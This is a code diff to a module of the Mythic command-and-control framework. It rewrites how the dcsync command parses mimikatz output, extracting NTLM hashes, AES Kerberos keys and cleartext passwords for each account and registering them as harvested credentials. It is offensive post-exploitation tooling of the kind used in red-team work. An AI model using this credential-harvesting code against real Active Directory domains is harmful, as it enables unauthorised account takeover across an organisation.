@@ -1,7 +1,11 @@
 from mythic_container.MythicCommandBase import *
 from os import path
 from mythic_container.MythicRPC import *
+# Import the credential-create classes by module: the star imports also bind the credential-search module's
+# MythicRPCCredentialData, which takes different (snake_case) arguments.
+from mythic_container.MythicGoRPC import send_mythic_rpc_credential_create as credential_create
 import mslex
+import re
 from .execute_pe import *
 
 
@@ -63,6 +67,93 @@ class DcSyncArguments(TaskArguments):
             )
 
 
+# mimikatz lsadump::dcsync output lines (kuhl_m_lsadump_dc.c), matched by label rather than by line offset:
+# which optional lines appear depends on the account and on /all, which requests fewer attributes.
+_DCSYNC_DOMAIN = re.compile(r"^\[DC\] '(?P<value>[^']+)' will be the domain$")
+_DCSYNC_SAM_USERNAME = re.compile(r"^SAM Username\s+: (?P<value>.+)$")
+_DCSYNC_HASH_NTLM = re.compile(r"^  Hash NTLM: (?P<value>\S+)$")
+_DCSYNC_PROPERTY = re.compile(r"^\* (?P<value>.+) \*$")
+_DCSYNC_KEY_LIST = re.compile(r"^    (?P<value>Credentials|ServiceCredentials|OldCredentials|OlderCredentials)$")
+_DCSYNC_KEY = re.compile(r"^      (?P<etype>\S+)\s+\(\d+\) : (?P<value>\S+)$")
+# Current Kerberos keys registered, with their hex length. des_cbc_md5 and the service, old and older key lists
+# are not registered.
+_DCSYNC_KEY_LENGTHS = {"aes256_hmac": 64, "aes128_hmac": 32}
+_DCSYNC_CLEARTEXT_INDENT = "    "
+
+
+def _is_hex(value: str, length: int) -> bool:
+    return len(value) == length and re.fullmatch(r"[0-9A-Fa-f]+", value) is not None
+
+
+def parse_dcsync_output(text: str) -> list:
+    """Return the credentials in mimikatz lsadump::dcsync output, one dict per value.
+
+    Each dict has credential_type, account, realm, credential and field (the output label it came from). The
+    account is the object's SAM Username and the realm is the domain from "[DC] '<domain>' will be the domain".
+    Registered per account: Hash NTLM (hash), the current aes256_hmac and aes128_hmac keys from
+    Primary:Kerberos-Newer-Keys (key), and Primary:CLEARTEXT (plaintext). Password history, LM hashes, other key
+    lists and other properties are not returned. Values with the wrong length or format are skipped.
+    """
+    rows = []
+    seen = set()
+    realm = ""
+    account = None
+    prop = None
+    key_list = None
+    cleartext_next = False
+
+    def add(credential_type, credential, field):
+        row = (credential_type, account, realm, credential)
+        if row not in seen:
+            seen.add(row)
+            rows.append({"credential_type": credential_type, "account": account, "realm": realm,
+                         "credential": credential, "field": field})
+
+    for line in text.replace("\r\n", "\n").split("\n"):
+        if cleartext_next:
+            # Primary:CLEARTEXT prints its value on the next line, indented four spaces.
+            cleartext_next = False
+            if account and line.startswith(_DCSYNC_CLEARTEXT_INDENT) and len(line) > len(_DCSYNC_CLEARTEXT_INDENT):
+                add("plaintext", line[len(_DCSYNC_CLEARTEXT_INDENT):], "Primary:CLEARTEXT")
+            continue
+        match = _DCSYNC_DOMAIN.match(line)
+        if match:
+            realm = match.group("value")
+            continue
+        if line.startswith("Object RDN "):
+            # A new directory object: nothing carries over from the previous one.
+            account, prop, key_list = None, None, None
+            continue
+        match = _DCSYNC_SAM_USERNAME.match(line)
+        if match:
+            account = match.group("value").strip()
+            continue
+        if not account:
+            continue
+        match = _DCSYNC_HASH_NTLM.match(line)
+        if match:
+            if _is_hex(match.group("value"), 32):
+                add("hash", match.group("value"), "Hash NTLM")
+            continue
+        match = _DCSYNC_PROPERTY.match(line)
+        if match:
+            prop, key_list = match.group("value"), None
+            cleartext_next = prop == "Primary:CLEARTEXT"
+            continue
+        if prop != "Primary:Kerberos-Newer-Keys":
+            continue
+        match = _DCSYNC_KEY_LIST.match(line)
+        if match:
+            key_list = match.group("value")
+            continue
+        match = _DCSYNC_KEY.match(line)
+        if match and key_list == "Credentials":
+            etype, value = match.group("etype"), match.group("value")
+            if etype in _DCSYNC_KEY_LENGTHS and _is_hex(value, _DCSYNC_KEY_LENGTHS[etype]):
+                add("key", value, etype)
+    return rows
+
+
 async def parse_credentials_dcsync(
     task: PTTaskCompletionFunctionMessage,
 ) -> PTTaskCompletionFunctionMessageResponse:
@@ -72,33 +163,32 @@ async def parse_credentials_dcsync(
     responses = await SendMythicRPCResponseSearch(
         MythicRPCResponseSearchMessage(TaskID=task.TaskData.Task.ID)
     )
-    for output in responses.Responses:
-        mimikatz_out = str(output.Response)
-        comment = "task {}".format(output.TaskID)
-        if mimikatz_out != "":
-            lines = mimikatz_out.split("\r\n")
-
-            for i in range(len(lines)):
-                line = lines[i]
-                if "Username" in line:
-                    # Check to see if Password is null
-                    if i + 2 >= len(lines):
-                        break
-                    uname = line.split(" : ")[1].strip()
-                    realm = lines[i + 1].split(" : ")[1].strip()
-                    passwd = lines[i + 2].split(" : ")[1].strip()
-                    if passwd != "(null)":
-                        cred_resp = await MythicRPC().execute(
-                            "create_credential",
-                            task_id=task.TaskData.Task.ID,
-                            credential_type="plaintext",
-                            account=uname,
-                            realm=realm,
-                            credential=passwd,
-                            comment=comment,
-                        )
-                        if cred_resp.status != MythicStatus.Success:
-                            raise Exception("Failed to register credential")
+    if not responses.Success:
+        raise Exception("Failed to read dcsync output: {}".format(responses.Error))
+    # Mythic returns the newest response first, and a line can span two responses: rejoin them in order.
+    output = "".join(
+        str(r.Response) for r in sorted(responses.Responses, key=lambda r: r.ResponseID)
+    )
+    rows = parse_dcsync_output(output)
+    if not rows:
+        return response
+    cred_resp = await credential_create.SendMythicRPCCredentialCreate(
+        credential_create.MythicRPCCredentialCreateMessage(
+            TaskID=task.TaskData.Task.ID,
+            Credentials=[
+                credential_create.MythicRPCCredentialData(
+                    CredentialType=row["credential_type"],
+                    Account=row["account"],
+                    Realm=row["realm"],
+                    Credential=row["credential"],
+                    Comment="dcsync {} (task {})".format(row["field"], task.TaskData.Task.DisplayID),
+                )
+                for row in rows
+            ],
+        )
+    )
+    if not cred_resp.Success:
+        raise Exception("Failed to register dcsync credentials: {}".format(cred_resp.Error))
     return response
 
 
